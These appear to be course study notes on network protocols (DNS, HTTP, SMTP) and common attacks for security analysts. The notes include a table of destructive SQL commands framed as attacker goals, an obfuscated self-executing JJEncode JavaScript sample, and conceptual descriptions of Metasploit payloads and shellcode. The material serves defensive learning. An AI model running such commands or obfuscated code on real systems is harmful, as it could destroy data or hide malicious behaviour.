%% #review %%
# [[DNS Operations]]
> DNS service enables access to the network resources by their names instead of having to remember their IP addresses.

| Term                          | Description                                                                                                                                                                 |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Resource Record Examples (RR) | - A records for hostname to IPv4 address mapping,<br>- MX records for domain name to mail server mapping, and <br>- NS records for specifying the name server for a domain. |
| DNS Server Example            | Shows A records mapping hostnames (e.g., hq-srv, inside-srv) to IP addresses (e.g., 192.168.1.2) within the secure-x.local domain, with hq-srv as the name server.          |
| DNS Resolver                  | The client side of DNS responsible for resource-mapping.                                                                                                                    |
| DNS Query                     | A request sent by a DNS resolver to a DNS server for information defined in an RR.                                                                                          |
| DNS Vulnerabilities           | Weak implementation allows for malicious activities.                                                                                                                        |

#### DNS Response Protocol
>UDP port 53 but uses TCP when exceeding 512 bytes or during zone transfers.

Used by DNS administrators to replicate DNS databases across a set of DNS servers.

#### DNS Distributed Database

| DNS Database Structure                                                                                                     | Domain Name Space                                                                                                               | Fully Qualified Domain Name (FQDN)                                                                                                  |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| A globally distributed, scalable, hierarchical, and dynamic database with no single server containing the entire database. | A tree-like data structure of linked domain names, starting from the root (represented by a dot) and branching into subdomains. | A hierarchical representation of a domain name, with each label separated by a dot and the top-level domain (TLD) at the far right. |
![17](/Course-Notes/.assets/Pasted_image_20241118122938.png)
#### DNS Terminology

| Term                          | Description                                                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Resource Record (RR)          | Defines DNS data types, including SOA, A/AAAA, MX, NS, PTR, and CNAME. Composed of NAME, TYPE, CLASS, TTL, RDLENGTH, and RDATA fields.                                                                                                                                                                                                                                |
| stub DNS resolvers            | Simple DNS resolvers on client devices that send DNS queries to recursive DNS resolvers to resolve domain names.                                                                                                                                                                                                                                                      |
| DNS Recursive Resolver        | Processes client DNS queries by querying authoritative DNS servers and returning the answer. (Resolves DNS queries on behalf of clients.)                                                                                                                                                                                                                             |
| Open DNS Recursive Resolver   | Allows queries from all IP addresses, potentially vulnerable to DDoS attacks.                                                                                                                                                                                                                                                                                         |
| Authoritative DNS Server Role | Responsible for managing the resource records (RRs) for a domain and providing authoritative responses to DNS queries.                                                                                                                                                                                                                                                |
| DNS Query Flow                | Stub DNS resolver issues DNS queries to the DNS recursive resolver. The DNS recursive resolver queries the necessary authoritative DNS servers for the resource record information. The authoritative DNS servers provide the authoritative responses back to the DNS recursive resolver. The DNS recursive resolver then provides the answer back to the DNS client. |
| DNS Zones                     | Contiguous portions of the DNS namespace Managed by a single administrative authority The authoritative source for the domains within the zone Defined in a zone file containing the resource records                                                                                                                                                                 |
### DNS RR Types

| Record Type  | Description                                                         |
| ------------ | ------------------------------------------------------------------- |
| A record     | Maps host names to IPv4 addresses.                                  |
| AAAA record  | Maps hostnames to IPv6 addresses.                                   |
| MX record    | Maps domain names to a list of mail servers.                        |
| PTR record   | Points to a canonical name, often used for reverse DNS lookups.     |
| NS record    | Identifies DNS servers responsible for a zone.                      |
| CNAME record | Specifies that a domain name is an alias for another domain name.   |
| TXT record   | Associates arbitrary text with a hostname, used in cases like DKIM. |
| SOA record   | Identifies the authoritative name server and sets zone parameters.  |
### The `nslookup` Utility

| Record Type | Description                                                      | Example                           |
| ----------- | ---------------------------------------------------------------- | --------------------------------- |
| A record    | Resolves a domain name to an IP address. `nslookup`              | nslookup dmz.secure-x.public      |
| PTR record  | Resolves an IP address to a domain name.<br>`nslookup set q=ptr` | nslookup -type=ptr 192.0.2.50     |
| MX record   | Specifies the mail servers for a domain.<br>`nslookup set q=mx`  | nslookup -type=mx secure-x.public |
## Dynamic DNS![16](/Course-Notes/.assets/Pasted_image_20241118140228.png)

| Feature                      | Description                                                                                                                                        |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| DDNS                         | A service that maps a static domain name to a dynamic IP address.                                                                                  |
| Use                          | Enabling connections to networks with dynamic IP addresses.                                                                                        |
| Malicious Use                | Threat actors use DDNS for malicious purposes like launching attacks with persistent connections to CnC servers or data exfiltration.              |
| Usage by Attackers           | Attackers frequently use DDNS services for generating subdomains.                                                                                  |
| Block Rate Comparison        | DDNS-based domain web traffic block rate is nearly 20%, significantly higher than the average block rate for all other web traffic (less than 1%). |
| High Block Rate DDNS Domains | Many DDNS-based domains are blocked with almost 100% frequency.                                                                                    |
## Recursive DNS Query

| DNS RR’s Role                                                                                      | Recursive DNS Request Processing                                    | Cached Information Handling                                                          |
| -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Retrieves DNS information from authoritative servers and provides it to the original DNS resolver. | More processing is required compared to non-recursive DNS requests. | The recursive DNS resolver may have cached information and respond with it directly. |
1. The DNS resolver queries the recursor for www.cisco.com’s address.
2. The recursor queries the root name servers for the .com domain.
3. The root name servers refer the recursor to the generic Top-Level Domain (gTLD) name servers.
4. The recursor queries the gTLD name servers for the .com domain.
5. The gTLD name servers refer the recursor to the .cisco.com name servers, ns1.cisco.com or ns2.cisco.com.
6. The recursor queries ns1.cisco.com or ns2.cisco.com for www.cisco.com’s address.
7. ns1.cisco.com or ns2.cisco.com sends an authoritative DNS query response with the A (address) RR information for www.cisco.com.
8. The recursor sends the A (address) RR information for www.cisco.com to the resolver. ![15](/Course-Notes/.assets/Pasted_image_20241118141325.png)

# [[HTTP Operations]]

#### HTTP Protocol Fundamentals

| HTTP Request                                            | HTTP Response                                       |
| ------------------------------------------------------- | --------------------------------------------------- |
| HTTP request method, URI, and protocol name and version | HTTP protocol name and version, and the status code |
| HTTP request headers and body                           | HTTP response headers and body                      |
#### HTTP Request Methods

| Method | Description                                                                            |
| ------ | -------------------------------------------------------------------------------------- |
| GET    | Retrieves data from the specified resource.                                            |
| HEAD   | Asks for a response identical to that of a GET request, but without the response body. |
| POST   | Creates data on the specified resource.                                                |
| PUT    | Updates data on the specified resource.                                                |
| DELETE | Deletes the specified resource.                                                        |

| HTTP Request  | ==Functionality==                                                            | ==Usage==                                                                                       | ==Example==                                                                                                                              |
| ------------- | ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| User Agent    | Identifies the web browser, version, and operating system to the web server. | Websites use it to adjust page design, while attackers manipulate it for malicious purposes.    | Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0                                                                 |
| HTTP Response | Status: 200 (indicates the request was successful).                          | Headers: Contain information about the web server (Apache/2.2.22) and content type (text/HTML). | Body: Contains the requested web page content, which is the default page indicating the server is running but no content has been added. |
## HTTP Status Codes

1xx are Informational
2xx are Success
3xx are Redirection 
4xx are Client Error 
5xx are Server Error

| Code | Description                            | Reason                                                                                                                               |
| ---- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 100  | Continue                               | The server has received the request headers and the client should proceed to send the request body.                                  |
| 200  | OK                                     | The processing of the request that was sent by the client was successful.                                                            |
| 301  | Moved Permanently                      | The resource has permanently moved to a different URI.                                                                               |
| 302  | Found                                  | The requested resource resides temporarily under a different URI.                                                                    |
| 307  | Temporarily Moved                      | The request should be repeated with another URI; however, future requests should still use the original URI.                         |
| 401  | Unauthorized (Authentication Required) | The request first requires authentication with the server.                                                                           |
| 403  | Forbidden                              | Access is denied.                                                                                                                    |
| 404  | Not Found                              | The server cannot find the requested URI.                                                                                            |
| 407  | Proxy Authentication Required          | The request first requires authentication with the proxy.                                                                            |
| 500  | Internal Server Error                  | This generic web server error message is given when an unexpected condition is encountered and no more specific message is suitable. |
## HTTP Cookies

| Cookie                         | Description                                                                                                                                                    |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Session Token                  | Identifies a particular session for the web server to track and manage user requests.                                                                          |
| Cookie-Based Session Hijacking | Attackers can impersonate users by stealing and using their cookies, allowing them to perform actions on behalf of the victim’s session.                       |
| Mitigating Cookie Hijacking    | Use HTTPS to encrypt web server and browser communications, and set the Secure flag on cookies to ensure they are only transmitted over encrypted connections. |
## HTTP Referer

| HTTP Referer               | Referer Header Definition                                                                            | Referer Header Usage                                               | Referer Header Example                                                                                                                                                                         |
| -------------------------- | ---------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Referer Header Definition: | The address of the previous web page from which a link to the currently requested page was followed. | Indicates the last page that the user was on when clicking a link. | In an HTTP GET request, the referer header might contain “[http://www.cisco.com](http://www.cisco.com/)” if the user clicked a link from the [www.cisco.com](http://www.cisco.com/) home page. |
![14](/Course-Notes/.assets/Pasted_image_20241118155710.png)

# [[URIs]]

| Type           | Purpose                               | Example                                                                                                |
| -------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| URL            | Locate and access a resource.         | [https://www.example.com/page.html](https://www.example.com/page.html)                                 |
| URN            | Identify a resource by name.          | urn:isbn:0451450523                                                                                    |
| Data URI       | Embed small data directly in the URI. | data:image/png;base64,…                                                                                |
| File URI       | Reference a local file.               | file:///C:/path/to/file.txt                                                                            |
| Mailto URI     | Specify an email address.             | [mailto:someone@example.com](mailto:contact@example.com)                                               |
| Tel URI        | Specify a phone number.               | tel:+123456789                                                                                         |
| SIP URI        | Initiate multimedia sessions.         | [sip:user@domain.com](mailto:sip:username@domain.com)                                                  |
| JavaScript URI | Execute JavaScript code.              | javascript:alert(‘Hello’)                                                                              |
| FTP URI        | Reference files using FTP.            | [ftp://ftp.example.com/](ftp://ftp.example.com/resource.txt)[file.txt](ftp://ftp.example.com/file.txt) |
# [[HTTPS Operations]]

**SSL Vulnerability:** SSL v3.0 is insecure due to the POODLE vulnerability, leading to its widespread disablement.
## HTTPS

| ==Purpose==                   | Provides secure communication between clients and servers over the internet.                                                                                                              |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ==Operations==                | Uses TLS/SSL handshake for secure connection, authenticates web servers using digital certificates, and encrypts data transmission.                                                       |
| ==Security Analysts==         | Understanding HTTPS is crucial for identifying and mitigating attacks that exploit its features.                                                                                          |
| ==Traffic Inspection==:       | Organizations can inspect HTTPS traffic by deploying next-generation firewalls or web proxies that act as MITMs to decrypt, inspect, and re-encrypt SSL/TLS traffic.                      |
| ==Security Analyst’s Role==   | Security analysts investigating security incidents involving HTTPS traffic often need to inspect logs from next-generation firewalls or web proxies to analyze SSL/TLS decryption events. |
| ==Compliance Considerations== | Organizations performing SSL/TLS decryption must ensure they comply with relevant government regulations regarding data confidentiality.                                                  |
## Web Server Digital Certificate

| Component           | Description                                                                                                                     |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| DC Purpose          | Communicates web service host ownership to clients, preventing impersonation.                                                   |
| CA Role             | Issues signed digital certificates on behalf of web service owners.                                                             |
| HTTPS Validation    | Web browsers trust certificate authorities to ensure secure connections.                                                        |
| Certificate Warning | The browser warns the user about an untrusted digital certificate.                                                              |
| User Decision       | The user can accept the risk and continue or ignore the warning.                                                                |
| Impact              | Ignoring the warning and visiting a malicious website breaks HTTPS security and allows attackers to impersonate the web server. |
# [[HTTPv2 Operations]]

| Feature                  | Description                                                                    |
| ------------------------ | ------------------------------------------------------------------------------ |
| Developed by             | IETF from the SPDY protocol (Google)                                           |
| Header Field Compression | Uses header field compression                                                  |
| Concurrent Exchanges     | Allows concurrent HTTP request/response exchanges onto the same TCP connection |
| Server Push              | Enables server push of data to the client                                      |
## HTTP/2 Streams

| Feature               | Description                                                                                                                    |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| HTTP/2 Streams        | Independent, bidirectional sequences of frames exchanged between client and server over a single TCP connection.               |
| Stream Multiplexing   | Each HTTP request/response exchange is assigned its own stream, allowing concurrent processing and preventing blocking issues. |
| Stream Prioritization | Clients can assign priorities to streams to influence resource allocation and transmission order, but it’s not a guarantee.    |
| Flow Control          | Flow control is through window_update frame, and cannot be disabled.                                                           |
| Priority              | Client assigns priority.                                                                                                       |
![13](/Course-Notes/.assets/Pasted_image_20241118174348.png)
## HTTP/2 Version Identification

| Protocol                  | Description                                       | Example                          |
| ------------------------- | ------------------------------------------------- | -------------------------------- |
| HTTP/2                    | Identified by the string ‘h2’ when used with TLS. | h2                               |
| HTTP/2 over cleartext TCP | Identified by the string ‘h2c’.                   | h2c                              |
| HTTP/1.1                  | Used for HTTP/2 upgrade requests.                 | GET / HTTP/1.1                   |
| HTTP/1.1                  | Response indicating HTTP/2 upgrade is accepted.   | HTTP/1.1 101 Switching Protocols |
| HTTP/2                    | Sent after the upgrade is complete.               | HTTP/2 frames …                  |
## Other Features of HTTP/2

| Feature                   | Description                                                         |
| ------------------------- | ------------------------------------------------------------------- |
| Request Prioritization    | Improves performance by completing more important requests first.   |
| Server Push               | Reduces latency by sending anticipated data to clients.             |
| Header Compression        | Uses HPACK to reduce redundant data in HTTP headers.                |
| HTTP/2 Message Processing | Uses binary message framing for efficient processing.               |
| HTTP/2 Frame Composition  | Headers and body are in binary format, collectively called a frame. |
| Important HTTP/2 Frames   | Headers frame (Type = 0x1) and data frame (Type = 0x0).             |
## HTTP/2 PCAP Example
![12](/Course-Notes/.assets/Pasted_image_20241118175158.png)

The following observations can be made about this example PCAP output:

1. The Wireshark display filter is http2.
2. Under the HTTP decode, the 139.162.123.124 server supports HTTP/2. It accepted the upgrade to HTTP/2 with a 101 Switching Protocols response with the **h2c** protocol identifier in the upgrade header field. The string **h2c** indicates that HTTP/2 is run over cleartext TCP.
3. Under the HTTP/2 decode, the stream ID is 0, indicating that it is a connection control message. Settings are specified, including the maximum concurrent streams and initial window size.
4. Flow control is achieved through the window_update frame.

## HTTP/2 Vulnerabilities

- ==Vulnerabilities==: HTTP/2 implementations are vulnerable to denial-of-service (DoS) attacks.
- ==Impact==: Attacks can consume excessive system resources and lead to distributed DoS (DDoS) attacks.
- ==Recommendation==: Review CERT/CC’s Vulnerability Note VU#605641 and contact vendors for updates.
# [[SQL Operations]]

| **Aspect**                  | **Details**                                                                                                            |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Functionality**           | Used to query, operate, and administer relational database management systems.                                         |
| **Usage**                   | Consistent across database systems that support it, but with specific intricacies for each system.                     |
| **SQL in Web Applications** | Often used to dynamically build SQL statements for interacting with databases, utilizing user-supplied web input data. |
| **SQL Injection Attack**    | An attack that alters SQL statements in a web application using attacker-supplied data.                                |
| **Vulnerability**           | Insufficient input validation in web applications.                                                                     |
| **Impact**                  | Varies based on the targeted application and its data processing.                                                      |
## SQL Commands

| Attacker’s Goal              | SQL Commands                                           | Description                                           |
| ---------------------------- | ------------------------------------------------------ | ----------------------------------------------------- |
| Exfiltrating data            | SELECT [fields] FROM [table] […]                       | Retrieves data from specified tables.                 |
| Modifying data               | UPDATE [table] SET [field] = [value] WHERE [condition] | Updates data in specified tables based on conditions. |
| ""                           | INSERT INTO [table] VALUES […]                         | Inserts new data into specified tables.               |
| ""                           | TRUNCATE TABLE [table]                                 | Truncates (deletes all data) from specified tables.   |
| Modifying database structure | DROP TABLE [table]                                     | Drops (deletes) specified tables.                     |
| ""                           | ALTER TABLE [table] […]                                | Alters (modifies) the structure of specified tables.  |
| ""                           | DROP DATABASE                                          | Drops (deletes) the entire database.                  |
# [[SMTP Operations]]

| Threat                   | Description                                                          | Impact                                                                   | Mitigation                                                      |
| ------------------------ | -------------------------------------------------------------------- | ------------------------------------------------------------------------ | --------------------------------------------------------------- |
| Spam and malicious email | Embedded attacks (viruses, malware) and targeted attacks (phishing). | Wastes employee time, consumes resources, and can lead to data breaches. | Understanding the mail delivery process and SMTP conversations. |
## SMTP Terminology

| Term                                               | Description                                                                                                                    |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Mail Transfer Agent (MTA)                          | A computer program that transfers electronic mail messages between computers.                                                  |
| DNS MX record                                      | Specifies the mail server (MTA) responsible for accepting email for a domain.                                                  |
| DNS A record                                       | Locates the IP address of the MTA specified by the MX record.                                                                  |
| Groupware server                                   | Accepts, forwards, delivers, and stores messages for users. Manages collaborative schedules and calendars.                     |
| SMTP client                                        | Initiates a connection request to an SMTP server.                                                                              |
| SMTP server                                        | Receives the connection request and initiates the mail transfer.                                                               |
| Mail user agent (MUA)                              | A software client application that accesses a groupware server to send or receive mail.                                        |
| Post Office Protocol (POP)                         | An application-layer protocol that retrieves email from a mail server using TCP port 110.                                      |
| Internet Message Access Protocol (IMAP)            | An application-layer protocol that retrieves email from a mail server on TCP port 143.                                         |
| Messaging Application Programming Interface (MAPI) | Primarily associated with Microsoft Exchange and Outlook, retrieves email from a mail server and provides groupware functions. |
## SMTP Flow
![11](/Course-Notes/.assets/Pasted_image_20241118201749.png)

| Step | Description                                                                                                            |
| ---- | ---------------------------------------------------------------------------------------------------------------------- |
| 1    | Alejandro sends an email to Emily.                                                                                     |
| 2    | Secure-x.public’s MTA resolves Emily’s domain to the Cisco MTA’s IP address using DNS.                                 |
| 3    | Secure-x.public’s MTA sends the email to [mx.cisco.com](http://mx.cisco.com/), the receiving MTA.                      |
| 4    | Assuming Secure-x.public’s reputation is good, the receiving MTA looks up Emily’s LDAP user and forwards the email.    |
| 5    | The exchange server sends the email to Emily’s MUA using protocols like POP, IMAP, or MAPI, with MAPI used by the MUA. |
| 6    | Alejandro replies to the received email using IMAP to retrieve the email from the exchange mail server.                |
## SMTP Conversation
![10](/Course-Notes/.assets/Pasted_image_20241118202105.png)

1. ==Envelope==: Specifies the recipient and sender.
2. ==Headers==: Sent after receiving a 354 reply code. Contain sender and recipient’s display names and emails, and the subject and date. A blank line separates headers from message content.
3. ==Body==: An optional text region transmitted after the DATA command is accepted, before the end of data indication. A null line or a period indicates the end of data transmission.

### SMTP commands
>Transfer requests from the client to the SMTP server. 

| Command      | Description                                                      | Usage                             |
| ------------ | ---------------------------------------------------------------- | --------------------------------- |
| HELO or EHLO | Identify the SMTP client to the server.                          | HELO or EHLO [FQDN or IP address] |
| MAIL FROM    | Initiate a mail transaction and specify the originator.          | MAIL FROM <sender@example.com>    |
| RCPT TO      | Identify a recipient of the mail data.                           | RCPT TO <recipient@example.com>   |
| DATA         | Signifies that the email message body will follow.               | DATA                              |
| QUIT         | Specifies that the receiver must close the transmission channel. | QUIT                              |
SMTP reply codes define the server response to the SMTP client:

- The first digit denotes the success or failure of the SMTP command.
    1 = command accepted but pending confirmation (example, 101 can’t open connection)        
    2 = success (example, 250 OK)
    3 = okay so far (example, 354 go ahead, also called start mail input)
    4 = temporary failure (example, 452 mailbox full)
    5 = permanent failure (example, 550 user unknown)
- The second digit categorizes the result.
    0 = syntax
    1 = information
    2 = connection
    3 = unspecified
    4 = unspecified
    5 = mail system
- The third digit adds finer detail.

# [[Web Scripting]]

| Feature            | Description                                                                            |
| ------------------ | -------------------------------------------------------------------------------------- |
| Static Web Content | Created using markup languages like HTML and XML, often with a .html extension.        |
| Document Rendering | Read by a web browser and displayed on the client’s screen in a human-readable format. |
| Source Code Access | Viewable in web browsers like Internet Explorer by navigating to View > Source.        |
```
<!DOCTYPE html>
<html>
<head>
<title>Page Title</title>
</head>
<body>

<h1>My First Heading</h1>
<p>My first paragraph.</p>

</body>
</html>
```

| Topic | Definition                                                             | Function                                                                   | Example Usage                                                                      |
| ----- | ---------------------------------------------------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| CSS   | A style sheet language used to describe the style of an HTML document. | Specifies how HTML elements should be displayed, such as background color. | background-color: lightblue; displays a light blue background color on a web page. |
```
<!DOCTYPE html>
<html>
<head>
==<style>
body {
    background-color: lightblue;
}
</style>==
</head>
<body>

<h1>Hello Cisco!</h1>

<p>This page has a light blue background color!</p>

</body>
</html>
```
## Server-Side and Client-Side Scripting

| Scripting Type        | Description                                                                        | Implementation                                                                                                  | Example                                                                           |
| --------------------- | ---------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| Server-Side Scripting | Implemented on web servers to generate customized responses for each user request. | Languages: PERL, Python, PHP, etc.                                                                              | N/A                                                                               |
| Client-Side Scripting | Executed by the user’s web browser to enhance interactivity.                       | Languages: JavaScript, Visual Basic Script, etc.                                                                | N/A                                                                               |
| JavaScript            | Used for client-side scripting.                                                    | Define JavaScript in a separate file and link to it using the src attribute of the script tag.                  | &lt;script type=“text/javascript” src=“scriptname.js”&gt;&lt;/script&gt;          |
| JavaScript            | Used for client-side scripting.                                                    | Embed JavaScript in a web page using the &lt;script type=“text/javascript”&gt; and &lt;/script&gt; tags.        | &lt;script type=“text/javascript”&gt;document.write(‘Hello Cisco’)&lt;/script&gt; |
| JavaScript            | Used for client-side scripting.                                                    | The &lt;script&gt; tag can also be used to tag the JavaScript instead of &lt;script type=“text/javascript”&gt;. | &lt;script&gt;document.write(‘Hello HTML 5’)&lt;/script&gt;                       |
# Obfuscated JavaScript

| Purpose                                                        | Goal                                                                                             | Technique                                              |
| -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------ |
| To disguise the appearance of source code and reduce its size. | To protect intellectual property by making JavaScript source code difficult to analyze or steal. | Encoding JavaScript into difficult-to-read statements. |
## Obfuscation techniques:
1. Automatically renaming variables to random names to reduce readability.
2. JavaScript ignores whitespace. White-space randomization involves inserting whitespace characters and line breaks without altering code functionality.
3. Self-modifying source code that rewrites itself during execution.
4. Character code and string manipulation combined with misusing ‘eval()’.

| Obfuscation Goal                                                            | Obfuscation Method                                                     | Obfuscation Effect                                  |
| --------------------------------------------------------------------------- | ---------------------------------------------------------------------- | --------------------------------------------------- |
| Prevent analysts from determining the intended functionality of the script. | Encoding the script makes it difficult to recognize the original code. | Decrypting the encoded script is a complex process. |

| Technique                 | Description                                                                                      |
| ------------------------- | ------------------------------------------------------------------------------------------------ |
| JavaScript Embedding      | JavaScript is embedded within HTML code and executed on the client-side system.                  |
| JavaScript Encoding       | Threat actors use encoding to hide malicious code within JavaScript.                             |
| JavaScript Obfuscation    | Disguises code functionality, but can be deciphered by experienced analysts.                     |
| JavaScript Analysis Tools | Tools like BurpSuite and JSDetox use de-obfuscation and HTML DOM emulation.                      |
| Manual De-obfuscation     | Typically not performed by Tier 1 SOC analysts, but they should recognize obfuscated JavaScript. |
In the following example, the variable was set as a two-character $a key. This key value was created during the encoding process using the encoder tool, JJEncode.

```
$a=~[];$a={___:++$a,$$$$:(![]+"")[$a],__$:++$a,$_$_:(![]+"")[$a],_$_:++$a,$_$$:({}+"")[$a],$$_$:($a[$a]+"")[$a],_$$:++$a,$$$_:(!""+"")[$a],$__:++$a,$_$:++$a,$$__:({}+"")[$a],$$_:++$a,$$$:++$a,$___:++$a,$__$:++$a};$a.$_=($a.$_=$a+"")[$a.$_$]+($a._$=$a.$_[$a.__$])+($a.$$=($a.$+"")[$a.__$])+((!$a)+"")[$a._$$]+($a.__=$a.$_[$a.$$_])+($a.$=(!""+"")[$a.__$])+($a._=(!""+"")[$a._$_])+$a.$_[$a.$_$]+$a.__+$a._$+$a.$;$a.$$=$a.$+(!""+"")[$a._$$]+$a.__+$a._+$a.$+$a.$$;$a.$=($a.___)[$a.$_][$a.$_];$a.$($a.$($a.$$+"\""+"\\"+$a.__$+$a._$_+"\"")())();
```

# [[Shellcode and Exploits]]
**Shellcode**

| **Category**                     | **Description**                                                                                                                                          |
|-----------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Shellcode**                     | A small piece of machine code used to exploit software vulnerabilities and launch a command shell on a target device.                                      |
| **Definition**                    | A small piece of machine code used to exploit software vulnerabilities and launch a command shell on a target device.                                      |
| **Function**                      | Provides command shell access on the target system, either locally or remotely.                                                                         |
| **Capabilities**                  | Can perform various functions, such as providing remote desktop access or adding backdoor accounts.                                                     |
| **Types**                         | - **Local Shellcode**: Exploits vulnerabilities with limited access. <br> - **Remote Shellcode**: Targets vulnerable processes on remote machines.         |
| **Windows Protection Mechanisms** | - **Data Execution Prevention (DEP)**: Prevents code execution from the data page. <br> - **Address Space Layout Randomization (ASLR)**: Randomizes memory addresses to hinder attacker access. |
| **Detection Methods**             | - **Network-based Detection**: Tools like Security Onion. <br> - **Host-based Detection**: Using Host Intrusion Detection Systems (HIDS) products.        |
| **NOP Sled Detection**            | Searching for a pattern of NOP instructions, which are often used by attackers to increase the likelihood of a successful attack.                       |
| **IDS Role in Detection**         | IDS systems like Snort and Bro can detect shellcode, often relying on signatures but can also be configured for non-signature-based detection.            |
**Memory-based Protection Measures** 

| Feature | Description                                                | Linux Implementation                                                                                                  |
| ------- | ---------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| DEP     | Prevents the use of the stack memory space for execution.  | Enabled by default in Ubuntu via the NX bit (if CPU supports it) or memory segmentation (if CPU does not support it). |
| ASLR    | Randomizes memory addresses to mitigate exploitation risk. | Not mentioned in the text.                                                                                            |
**Attacking memory**

| Attacking memory                | Description                                                                                                                 |
| ------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| ==Stack Grooming==              | Preparing the stack for execution, often used to call a shell.                                                              |
| ==ASLR Bypass==                 | Egg-hunting technique allows attackers to identify the location of malicious payloads in memory despite ASLR randomization. |
| ==DEP Circumvention==           | Utilizing heap memory to bypass Data Execution Prevention (DEP).                                                            |
| ==Staged==                      | Designed to be compact, fitting within memory space limitations for an exploit.                                             |
| ==Unstaged==                    | Not subject to memory space limitations, with all portions residing within a single memory space.                           |
| ==Shellcode Detection Methods== | Snort rules in Security Onion can detect specific types of shellcode, including those from Network Mapper scans.            |
| ==Obfuscated Shellcode==        | Obfuscated or encrypted shellcode is becoming more common to evade detection.                                               |
**NOP Sled**

| Section                         | Description                                                                                                                                |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Definition                      | A segment of no-operation instructions used to pad shellcode and increase the likelihood of successful exploit execution.                  |
| Functionality                   | Serves as a buffer that allows for imprecise memory addressing during exploit execution.                                                   |
| Execution                       | Execution begins at the NOP sled’s start and progresses through the NOP instructions until reaching the shellcode.                         |
| SOC Analyst’s Role              | Utilize network intrusion detection systems like Snort and Bro to detect shellcode.                                                        |
| Shellcode Detection Limitations | Snort and Bro rely on signatures for accurate detection, potentially missing unknown, non-signature-based shellcode.                       |
| Mitigation Strategy             | Configure systems with generic signatures and analyze events for potential threat actors, escalating to higher tiers for immediate action. |
![9](/Course-Notes/.assets/Pasted_image_20241119130532.png)
# [[Common Metasploit Payloads]]

| Type    | Description                                                                                                                                                                                                             |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Singles | Self-contained payloads that function on their own.                                                                                                                                                                     |
| Stagers | Establish the required communications path between the attack platform and the target host.                                                                                                                             |
| Stages  | The payload that is delivered to the target host. Stages are used with the stagers, and contain everything outside of the network communications component to perform execution and ultimately exploit the target host. |
## Singles

- ==Definition==: Self-contained payloads that can function independently of the Metasploit framework.
- ==Execution==: Can be executed with handlers outside of the Metasploit framework and are well-documented.
- ==Detection and Prevention==: Easy to detect, block, and log, making them less effective for stealthy attacks.

## Stagers

- ==Functionality==: Establishes a network connection between the attacker and victim, facilitating the upload and download of information.
- ==Design==: Simplistic, compact, and reliable.
- ==Purpose==: To set up a communications path for the attack platform to communicate with the target host.

## Stages

- ==Definition==: Payload delivered to the target host, providing increased functionality compared to stagers.
- ==Types==: Precompiled and configured or customized before deployment.
- ==Functionality==: Self-contained components for executing and exploiting the target host, excluding network communications.
## Other Payloads

| Payload Type             | Description                                                                                                           | Advantages                                                           | Disadvantages                                                                                               |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Meterpreter              | Runs in memory on the target host, avoiding detection by host-based intrusion detection systems.                      | Does not need to start its own process.                              | N/A                                                                                                         |
| PassiveX                 | Circumvents outbound firewalls by creating a hidden instance of Internet Explorer using ActiveX control.              | N/A                                                                  | ActiveX techniques are continuously updated to prevent attacks.                                             |
| NoNX                     | Bypasses DEP on systems with NoNX CPU feature.                                                                        | N/A                                                                  | N/A                                                                                                         |
| Ord                      | Windows stager-based payload.                                                                                         | Compatible with Windows 9x and later without a return address, Small | Relies on ws2_32.dll being loaded in the target process before exploitation, Less stable than other stagers |
| IPv6                     | Allows Metasploit and its payloads to function like IPv4 network-configured payloads.                                 | N/A                                                                  | N/A                                                                                                         |
| Reflective DLL injection | Injects a stage payload into a compromised host process running in memory, avoiding writing to the target hard drive. | Used by VNC and Meterpreter payloads.                                | N/A                                                                                                         |
# [[Directory Traversal]]

- ==Attack Type==: Directory traversal attacks exploit improper input validation to gain access to a file system.
- ==Exploitation==: Attackers exploit poor programming practices that fail to validate user input, allowing them to navigate outside the intended directory structure.
- ==Impact==: Attackers can access files and directories they shouldn’t have access to.

| Aspect                | Description                                                                                                                                                                                                       |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Attack Target         | Web servers and their root directories.                                                                                                                                                                           |
| Attack Goal           | Accessing files and directories outside the web server’s root directory.                                                                                                                                          |
| Attack Method         | Crafting URLs to navigate to restricted directories and potentially execute programs on the host server.                                                                                                          |
| URL Structure         | The URL is divided into two parts: the beginning ([https://drive.google.com](https://drive.google.com/)) represents the website being visited, while the rest functions like a directory structure on a computer. |
| Directory Traversal   | This technique allows exploration of the file system by navigating through subfolders to access content.                                                                                                          |
| Analyst Familiarity   | Characters used in command-line navigation can be incorporated to aid in understanding the directory traversal process.                                                                                           |
